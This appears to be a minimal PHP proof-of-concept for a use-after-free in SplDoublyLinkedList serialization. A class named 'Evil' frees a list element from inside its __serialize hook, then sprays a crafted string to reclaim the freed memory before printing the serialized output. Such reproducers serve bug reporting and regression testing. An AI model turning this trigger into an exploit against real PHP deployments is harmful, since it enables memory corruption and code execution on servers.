<?php
class Evil {
    public function __serialize(): array {
        global $dll, $spray;
        unset($dll[0]);
        $spray = str_repeat("A", 7);
        for ($i = 0; $i < 4; $i++) {
            $spray[$i] = chr((4 >> ($i * 8)) & 0xff);
        }
        return [];
    }
}
$dll = new SplDoublyLinkedList();
$dll->push([new Evil(), [1, 2, 3]]);
$dll->push("victim");
echo bin2hex($dll->serialize()), "\n";
